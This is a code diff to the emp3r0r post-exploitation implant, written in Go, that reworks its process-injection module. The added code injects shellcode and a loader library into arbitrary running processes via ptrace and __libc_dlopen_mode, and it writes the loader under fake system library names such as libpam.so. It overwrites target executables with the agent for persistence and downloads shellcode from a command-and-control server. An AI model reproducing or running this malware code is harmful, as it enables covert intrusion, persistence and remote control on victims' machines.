@@ -21,7 +21,7 @@ import (
 )
 
 // inject a shared library using dlopen
-func gdbInjectSO(path_to_so string, pid int) error {
+func gdbInjectSOWorker(path_to_so string, pid int) error {
 	gdb_path := emp3r0r_data.UtilsPath + "/gdb"
 	if !util.IsFileExist(gdb_path) {
 		res := VaccineHandler()
@@ -68,9 +68,9 @@ func gdbInjectSO(path_to_so string, pid int) error {
 	return nil
 }
 
-// Injector inject shellcode to arbitrary running process
+// ShellcodeInjector inject shellcode to arbitrary running process
 // target process will be restored after shellcode has done its job
-func Injector(shellcode *string, pid int) error {
+func ShellcodeInjector(shellcode *string, pid int) error {
 	// format
 	*shellcode = strings.Replace(*shellcode, ",", "", -1)
 	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
@@ -193,6 +193,38 @@ func Injector(shellcode *string, pid int) error {
 		}
 		log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)
 
+		// what's after RIP when stopped
+		peek_stop := make([]byte, 32)
+		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rip), peek_stop)
+		if err != nil {
+			return fmt.Errorf("PEEK: 0x%x", stoppedRegs.Rip)
+		}
+		log.Printf("Peeked %d bytes from RIP: %x at RIP (0x%x)", n, peekWord, stoppedRegs.Rip)
+
+		peek_stack := make([]byte, 128)
+		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsp), peek_stack)
+		if err != nil {
+			log.Printf("PEEK stack: 0x%x", stoppedRegs.Rsp)
+		}
+		// also the regs
+		peek_rdi := make([]byte, 64)
+		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rdi), peek_rdi)
+		if err != nil {
+			log.Printf("PEEK RDI: 0x%x", stoppedRegs.Rdi)
+		}
+		peek_rsi := make([]byte, 64)
+		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsi), peek_rsi)
+		if err != nil {
+			log.Printf("PEEK RSI: 0x%x", stoppedRegs.Rsi)
+		}
+		log.Printf("At (0x%x), RAX = 0x%x RDI = 0x%x -> 0x%x (%s), RSI = 0x%x -> 0x%x (%s)\n"+
+			"Stack (0x%x) = 0x%x (%s)",
+			stoppedRegs.Rip,
+			stoppedRegs.Rax,
+			stoppedRegs.Rdi, peek_rdi, peek_rdi,
+			stoppedRegs.Rsi, peek_rsi, peek_rsi,
+			stoppedRegs.Rsp, peek_stack, peek_stack)
+
 		// restore registers
 		err = syscall.PtraceSetRegs(pid, origRegs)
 		if err != nil {
@@ -225,9 +257,39 @@ func Injector(shellcode *string, pid int) error {
 	return nil
 }
 
+func injectSOWorker(so_path string, pid int) (err error) {
+	dlopen_addr := GetSymFromLibc(pid, "__libc_dlopen_mode")
+	if dlopen_addr == 0 {
+		return fmt.Errorf("failed to get __libc_dlopen_mode address")
+	}
+	shellcode := gen_dlopen_shellcode(so_path, dlopen_addr)
+	if len(shellcode) == 0 {
+		return fmt.Errorf("failed to generate dlopen shellcode")
+	}
+	return ShellcodeInjector(&shellcode, pid)
+}
+
+// InjectSO inject loader.so into any process, using shellcode
+// locate __libc_dlopen_mode in memory then use it to load SO
+func InjectSO(pid int) error {
+	so_path, err := prepare_injectSO(pid)
+	if err != nil {
+		return err
+	}
+	return injectSOWorker(so_path, pid)
+}
+
 // Inject loader.so into any process
 func GDBInjectSO(pid int) error {
-	so_path := fmt.Sprintf("%s/libtinfo.so.2.1.%d", emp3r0r_data.UtilsPath, util.RandInt(0, 30))
+	so_path, err := prepare_injectSO(pid)
+	if err != nil {
+		return err
+	}
+	return gdbInjectSOWorker(so_path, pid)
+}
+
+func prepare_injectSO(pid int) (so_path string, err error) {
+	so_path = fmt.Sprintf("%s/libtinfo.so.2.1.%d", emp3r0r_data.UtilsPath, util.RandInt(0, 30))
 	if os.Geteuid() == 0 {
 		root_so_path := fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
 		so_path = root_so_path
@@ -235,43 +297,91 @@ func GDBInjectSO(pid int) error {
 	if !util.IsFileExist(so_path) {
 		out, err := golpe.ExtractFileFromString(emp3r0r_data.LoaderSO_Data)
 		if err != nil {
-			return fmt.Errorf("Extract loader.so failed: %v", err)
+			return "", fmt.Errorf("Extract loader.so failed: %v", err)
 		}
 		err = ioutil.WriteFile(so_path, out, 0644)
 		if err != nil {
-			return fmt.Errorf("Write loader.so failed: %v", err)
+			return "", fmt.Errorf("Write loader.so failed: %v", err)
 		}
 	}
-	return gdbInjectSO(so_path, pid)
+	return
 }
 
-// InjectShellcode inject shellcode to a running process using various methods
-func InjectShellcode(pid int, method string) (err error) {
+// prepare for guardian_shellcode injection, targeting pid
+func prepare_guardian_sc(pid int) (shellcode string, err error) {
+	// prepare guardian_shellcode
+	proc_exe := util.ProcExe(pid)
+	// backup original binary
+	err = CopyProcExeTo(pid, emp3r0r_data.AgentRoot+"/"+util.FileBaseName(proc_exe))
+	if err != nil {
+		return "", fmt.Errorf("failed to backup %s: %v", proc_exe, err)
+	}
+	err = CopySelfTo(proc_exe)
+	if err != nil {
+		return "", fmt.Errorf("failed to overwrite %s with emp3r0r: %v", proc_exe, err)
+	}
+	sc := gen_guardian_shellcode(proc_exe)
+
+	return sc, nil
+}
+
+// InjectorHandler handles `injector` module
+func InjectorHandler(pid int, method string) (err error) {
 	// prepare the shellcode
 	prepare_sc := func() (shellcode string, shellcodeLen int) {
 		sc, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/shellcode.txt", "")
 
 		if err != nil {
 			log.Printf("Failed to download shellcode.txt from CC: %v", err)
-			sc = []byte(emp3r0r_data.GuardianShellcode)
-			err = CopySelfTo(emp3r0r_data.GuardianAgentPath)
+			// prepare guardian_shellcode
+			emp3r0r_data.GuardianShellcode, err = prepare_guardian_sc(pid)
 			if err != nil {
+				log.Printf("Failed to prepare_guardian_sc: %v", err)
 				return
 			}
+			sc = []byte(emp3r0r_data.GuardianShellcode)
 		}
 		shellcode = string(sc)
 		shellcodeLen = strings.Count(string(shellcode), "0x")
-		log.Printf("Downloaded %d of shellcode, preparing to inject", shellcodeLen)
+		log.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
 		return
 	}
 
 	// dispatch
 	switch method {
-	case "gdb":
+	case "gdb_loader":
+		err = CopySelfTo("/tmp/emp3r0r")
+		if err != nil {
+			return
+		}
 		err = GDBInjectSO(pid)
-	case "native":
+		if err == nil {
+			err = os.RemoveAll("/tmp/emp3r0r")
+			if err != nil {
+				return
+			}
+		}
+	case "inject_shellcode":
 		shellcode, _ := prepare_sc()
-		err = Injector(&shellcode, pid)
+		err = ShellcodeInjector(&shellcode, pid)
+		if err != nil {
+			return
+		}
+
+		// restore original binary
+		err = CopyProcExeTo(pid, util.ProcExe(pid)) // as long as the process is still running
+	case "inject_loader":
+		err = CopySelfTo("/tmp/emp3r0r")
+		if err != nil {
+			return
+		}
+		err = InjectSO(pid)
+		if err == nil {
+			err = os.RemoveAll("/tmp/emp3r0r")
+			if err != nil {
+				return
+			}
+		}
 	default:
 		err = fmt.Errorf("%s is not supported", method)
 	}
